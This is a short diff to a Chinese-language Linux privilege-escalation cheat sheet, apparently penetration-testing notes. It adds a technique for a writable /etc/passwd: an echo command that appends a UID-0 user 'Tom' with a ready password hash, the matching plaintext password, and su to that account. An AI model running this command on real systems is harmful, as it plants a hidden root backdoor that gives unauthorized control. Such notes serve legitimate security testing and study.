@@ -51,6 +51,11 @@
 ----------------------------------------
 - linux exploit suggester（kernel<3.4.4）
 - 明文root密码/密码复用
+- 可写入的/etc/passwd文件提权
+	- 查询写入权限：ls -al /etc/passwd
+	- 写入：echo 'Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash' >> /etc/passwd
+	- 密码为：Password@973
+	- su Tom
 - 脏牛漏洞本地提权
 - 内核漏洞利用
     - searchspolit linux
